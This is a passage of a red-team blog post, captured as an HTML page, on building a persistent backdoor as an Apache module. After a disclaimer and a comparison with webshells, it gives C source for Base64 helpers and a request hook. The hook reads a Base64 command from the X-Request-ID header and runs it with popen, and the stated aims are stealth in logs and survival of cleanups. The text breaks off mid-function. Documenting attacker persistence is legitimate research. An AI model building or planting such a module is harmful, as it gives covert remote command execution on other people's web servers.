<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Persistent Backdoors via Apache Modules üï∑Ô∏è | s0ld13r&#39;s blog</title>
<meta name="keywords" content="backdoor, apache, persistence, red-team">
<meta name="description" content="
DISCLAIMER:
This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.
Intro

While studying APT and Red Team materials, I came across an excellent article from CICADA8 about establishing persistence in infrastructure through IIS modules instead of classic webshells.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/apache-modules-persistence/">
<link crossorigin="anonymous" href="http://localhost:1313/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/apache-modules-persistence/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="s0ld13r&#39;s blog (Alt + H)">s0ld13r&#39;s blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Persistent Backdoors via Apache Modules üï∑Ô∏è
    </h1>
    <div class="post-meta"><span title='2025-10-30 09:36:24 +0500 +05'>October 30, 2025</span>&nbsp;¬∑&nbsp;9 min

</div>
  </header> 
  <div class="post-content"><blockquote>
<p><strong>DISCLAIMER:</strong>
This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.</p></blockquote>
<h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
<p><img alt="Article" loading="lazy" src="http://localhost:1313/apache-persistence-cover.png"></p>
<p>While studying APT and Red Team materials, I came across an excellent article from <a href="https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9">CICADA8</a> about establishing persistence in infrastructure through IIS modules instead of classic webshells.</p>
<p>In the Windows ecosystem, the typical approach involves writing a DLL and registering it as a service or system component to extend native APIs. This sparked an idea: what if we implemented a similar technique for Linux environments using Apache modules?</p>
<p>I&rsquo;m not the first to explore this vector. Researchers from <a href="https://www.welivesecurity.com/2012/12/20/malicious-apache-module-a-clarification/">ESET documented this technique back in 2012</a>, but as they say, everything old is new again. Despite its potential, this technique remains relatively undocumented and underexplored in modern security literature. After some research, I discovered that Apache supports extending its functionality through modules (mods), which are primarily written in C.</p>
<h3 id="why-apache-modules-over-traditional-webshells">Why Apache Modules Over Traditional Webshells?<a hidden class="anchor" aria-hidden="true" href="#why-apache-modules-over-traditional-webshells">#</a></h3>
<p>The advantages of this approach compared to conventional webshells are compelling:</p>
<ul>
<li><strong>Process-level execution</strong>: The module runs inside the web server process and doesn&rsquo;t reside in the public webroot, making it significantly harder to discover through simple file enumeration</li>
<li><strong>URL-agnostic operation</strong>: Not tied to a specific endpoint, providing flexibility in backdoor logic implementation</li>
<li><strong>Stealth</strong>: Much harder to detect through standard Apache access logs since the malicious activity occurs at the module level</li>
<li><strong>Persistence</strong>: Survives webroot cleanups and application redeployments</li>
</ul>
<p>This article explores these attack vectors for research purposes and does not encourage malicious activity. Let&rsquo;s dive into the technical implementation.</p>
<h2 id="module-development">Module Development<a hidden class="anchor" aria-hidden="true" href="#module-development">#</a></h2>
<p>To develop a functional Apache2 module backdoor, we first need to define our core requirements. For this Proof of Concept, I established the following functionality goals:</p>
<h3 id="technical-requirements">Technical Requirements<a hidden class="anchor" aria-hidden="true" href="#technical-requirements">#</a></h3>
<ol>
<li><strong>Base64 encoding</strong>: Commands should be transmitted in Base64 format, and output should be returned encoded as well</li>
<li><strong>Global interception</strong>: The module should intercept all requests to the web application without being tied to a specific URL endpoint</li>
<li><strong>Header-based communication</strong>: The server receives commands via HTTP request headers and returns output to the client</li>
<li><strong>Minimal footprint</strong>: Avoid obvious indicators of compromise in standard logs</li>
</ol>
<h3 id="implementation-overview">Implementation Overview<a hidden class="anchor" aria-hidden="true" href="#implementation-overview">#</a></h3>
<p>With our technical requirements formalized, we can proceed with the backdoor implementation. Full disclosure: I leveraged AI chatbots and LLMs to accelerate the development process.</p>
<h4 id="core-imports">Core Imports<a hidden class="anchor" aria-hidden="true" href="#core-imports">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;httpd.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;http_config.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;http_protocol.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;ap_config.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;http_request.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span></code></pre></div><p>These headers provide the necessary Apache API functions and standard C libraries for our module.</p>
<h4 id="base64-decoder-implementation">Base64 Decoder Implementation<a hidden class="anchor" aria-hidden="true" href="#base64-decoder-implementation">#</a></h4>
<p>The decoder converts Base64-encoded commands received from the attacker into plaintext for execution:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">b64decode</span>(<span style="color:#66d9ef">apr_pool_t</span> <span style="color:#f92672">*</span>pool, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input, <span style="color:#66d9ef">size_t</span> <span style="color:#f92672">*</span>out_len) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(input);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>output <span style="color:#f92672">=</span> <span style="color:#a6e22e">apr_pcalloc</span>(pool, len);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> b64_table[<span style="color:#ae81ff">256</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;A&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, [<span style="color:#e6db74">&#39;B&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, [<span style="color:#e6db74">&#39;C&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, [<span style="color:#e6db74">&#39;D&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>, [<span style="color:#e6db74">&#39;E&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>, [<span style="color:#e6db74">&#39;F&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>, [<span style="color:#e6db74">&#39;G&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">6</span>, [<span style="color:#e6db74">&#39;H&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;I&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>, [<span style="color:#e6db74">&#39;J&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">9</span>, [<span style="color:#e6db74">&#39;K&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, [<span style="color:#e6db74">&#39;L&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">11</span>, [<span style="color:#e6db74">&#39;M&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">12</span>, [<span style="color:#e6db74">&#39;N&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">13</span>, [<span style="color:#e6db74">&#39;O&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">14</span>, [<span style="color:#e6db74">&#39;P&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;Q&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>, [<span style="color:#e6db74">&#39;R&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">17</span>, [<span style="color:#e6db74">&#39;S&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>, [<span style="color:#e6db74">&#39;T&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">19</span>, [<span style="color:#e6db74">&#39;U&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>, [<span style="color:#e6db74">&#39;V&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">21</span>, [<span style="color:#e6db74">&#39;W&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">22</span>, [<span style="color:#e6db74">&#39;X&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">23</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;Y&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>, [<span style="color:#e6db74">&#39;Z&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">25</span>, [<span style="color:#e6db74">&#39;a&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">26</span>, [<span style="color:#e6db74">&#39;b&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">27</span>, [<span style="color:#e6db74">&#39;c&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">28</span>, [<span style="color:#e6db74">&#39;d&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">29</span>, [<span style="color:#e6db74">&#39;e&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>, [<span style="color:#e6db74">&#39;f&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">31</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;g&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>, [<span style="color:#e6db74">&#39;h&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>, [<span style="color:#e6db74">&#39;i&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">34</span>, [<span style="color:#e6db74">&#39;j&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">35</span>, [<span style="color:#e6db74">&#39;k&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">36</span>, [<span style="color:#e6db74">&#39;l&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">37</span>, [<span style="color:#e6db74">&#39;m&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">38</span>, [<span style="color:#e6db74">&#39;n&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">39</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;o&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">40</span>, [<span style="color:#e6db74">&#39;p&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">41</span>, [<span style="color:#e6db74">&#39;q&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">42</span>, [<span style="color:#e6db74">&#39;r&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">43</span>, [<span style="color:#e6db74">&#39;s&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">44</span>, [<span style="color:#e6db74">&#39;t&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">45</span>, [<span style="color:#e6db74">&#39;u&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">46</span>, [<span style="color:#e6db74">&#39;v&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">47</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;w&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">48</span>, [<span style="color:#e6db74">&#39;x&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">49</span>, [<span style="color:#e6db74">&#39;y&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">50</span>, [<span style="color:#e6db74">&#39;z&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">51</span>, [<span style="color:#e6db74">&#39;0&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">52</span>, [<span style="color:#e6db74">&#39;1&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span>, [<span style="color:#e6db74">&#39;2&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">54</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">55</span>,
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;4&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">56</span>, [<span style="color:#e6db74">&#39;5&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">57</span>, [<span style="color:#e6db74">&#39;6&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">58</span>, [<span style="color:#e6db74">&#39;7&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">59</span>, [<span style="color:#e6db74">&#39;8&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">60</span>, [<span style="color:#e6db74">&#39;9&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">61</span>, [<span style="color:#e6db74">&#39;+&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">62</span>, [<span style="color:#e6db74">&#39;/&#39;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (i <span style="color:#f92672">&lt;</span> len) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> input[i<span style="color:#f92672">++</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">||</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">||</span> (b64_table[(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)c] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> c <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;A&#39;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        buf <span style="color:#f92672">=</span> (buf <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">|</span> b64_table[(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)c];
</span></span><span style="display:flex;"><span>        bits <span style="color:#f92672">+=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bits <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">8</span>) {
</span></span><span style="display:flex;"><span>            bits <span style="color:#f92672">-=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>            output[j<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (buf <span style="color:#f92672">&gt;&gt;</span> bits) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (out_len) <span style="color:#f92672">*</span>out_len <span style="color:#f92672">=</span> j;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="base64-encoder-implementation">Base64 Encoder Implementation<a hidden class="anchor" aria-hidden="true" href="#base64-encoder-implementation">#</a></h4>
<p>The encoder converts command output back to Base64 for transmission to the attacker:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">b64encode</span>(<span style="color:#66d9ef">apr_pool_t</span> <span style="color:#f92672">*</span>pool, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input, <span style="color:#66d9ef">size_t</span> len) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> b64_chars[] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> out_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> ((len <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>output <span style="color:#f92672">=</span> <span style="color:#a6e22e">apr_pcalloc</span>(pool, out_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (i <span style="color:#f92672">&lt;</span> len) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint32_t</span> octet_a <span style="color:#f92672">=</span> i <span style="color:#f92672">&lt;</span> len <span style="color:#f92672">?</span> input[i<span style="color:#f92672">++</span>] <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint32_t</span> octet_b <span style="color:#f92672">=</span> i <span style="color:#f92672">&lt;</span> len <span style="color:#f92672">?</span> input[i<span style="color:#f92672">++</span>] <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint32_t</span> octet_c <span style="color:#f92672">=</span> i <span style="color:#f92672">&lt;</span> len <span style="color:#f92672">?</span> input[i<span style="color:#f92672">++</span>] <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint32_t</span> triple <span style="color:#f92672">=</span> (octet_a <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">|</span> (octet_b <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> octet_c;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output[j<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> b64_chars[(triple <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">18</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>];
</span></span><span style="display:flex;"><span>        output[j<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> b64_chars[(triple <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>];
</span></span><span style="display:flex;"><span>        output[j<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (i <span style="color:#f92672">&gt;</span> len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">:</span> b64_chars[(triple <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>];
</span></span><span style="display:flex;"><span>        output[j<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (i <span style="color:#f92672">&gt;</span> len) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">:</span> b64_chars[triple <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    output[out_len] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="request-hook-handler">Request Hook Handler<a hidden class="anchor" aria-hidden="true" href="#request-hook-handler">#</a></h4>
<p>This is the core logic that intercepts HTTP requests, extracts commands, executes them, and returns the output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">admin_exec_hook</span>(request_rec <span style="color:#f92672">*</span>r)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Skip subrequests
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (r<span style="color:#f92672">-&gt;</span>main) <span style="color:#66d9ef">return</span> DECLINED;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Check for our trigger header
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>hdr_enc <span style="color:#f92672">=</span> <span style="color:#a6e22e">apr_table_get</span>(r<span style="color:#f92672">-&gt;</span>headers_in, <span style="color:#e6db74">&#34;X-Request-ID&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdr_enc) <span style="color:#66d9ef">return</span> DECLINED;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Decode the command
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">size_t</span> cmd_len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">b64decode</span>(r<span style="color:#f92672">-&gt;</span>pool, hdr_enc, <span style="color:#f92672">&amp;</span>cmd_len);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>cmd <span style="color:#f92672">||</span> cmd_len <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> DECLINED;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ap_set_content_type</span>(r, <span style="color:#e6db74">&#34;text/plain&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Execute command via popen
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)cmd, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fp) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ap_rputs</span>(<span style="color:#e6db74">&#34;failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, r);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> OK;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
